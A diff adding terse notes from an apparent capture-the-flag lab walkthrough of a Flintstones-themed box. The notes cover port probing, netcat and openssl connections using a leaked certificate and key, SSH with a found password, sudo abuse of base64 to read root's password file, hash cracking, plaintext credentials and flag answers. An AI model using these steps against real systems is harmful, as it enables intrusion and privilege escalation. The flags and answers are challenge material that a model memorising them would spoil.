@@ -1,0 +1,66 @@
+B3dr0ck
+22
+80
+4040
+Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
+| 	Bamm Bamm tried to setup a sql database, but I don't see it running.
+| 	Looks like it started something else, but I'm not sure how to turn it off...
+| 	said it was from the toilet and OVER 9000!
+|_	Need to try and secure
+Nginx backend
+There is a sql database?
+Sql inject?
+Probably running on a port >9000
+9009
+Curl: Received HTTP/0.9 when not allowed
+Uh oh thats not good for them
+An error occurred during a connection to 10.10.236.14:9009. SSL received a record that exceeded the maximum permissible length.
+What the hell is this?
+OOOOOHHHH
+nc 10.10.236.14 9009
+“Welcome to ABC” What are you looking for?
+Private key
+Got a private key
+Certificate
+Got cert :)
+Fred
+Got a picture of fred in ascii
+54321
+Nmap: Error: 'undefined' is not authorized for access.
+Something to do with the TLS certificate
+What about the key and cert I got from 9009 :)
+openssl s_client -connect 10.10.236.14:54321 -cert cert -key privkey
+Got a weird shell :)
+Password hint:
+d1ad7c0a3805955a35eb260dab4180dd
+User = ‘ Barney Rubble ‘
+Does not match any hashes :(
+Barney
+ssh barney@ip 
+Password is d1ad7c0a3805955a35eb260dab4180dd
+Cat barney.txt
+THM{f05780f08f0eb1de65023069d0e4c90c}
+Linpeas shows nothing useful
+Sudo -l with barney password shows that he can run /usr/bin/certutil with sudo
+Sudo certutil ls
+Shows where the fred certificate is but we cant read it
+This is not the actual “certutil” command but a modified one that trolls you if you mess up with the input.
+Got an error thrown and it points to a .js file
+Client.js appears to be source code for the certutil command
+Server.js is source code for the certificate giver on 9009
+Has base 64 encoded passwords for Fred and Barney
+fred:YabbaDabbaD0000!
+Barney:d1ad7c0a3805955a35eb260dab4180dd
+Fred
+sudo -l
+/usr/bin/base64 /root/pass.txt
+TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==
+Multiple layers of encoding
+sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d	
+a00a12aad6b7c16bf07032bd05a31d56
+Nothing…hint says use crackstation
+Crackstation
+root:flinstonesvitamins
+Wow.
+root.txt
+THM{de4043c009214b56279982bf10a661b7}
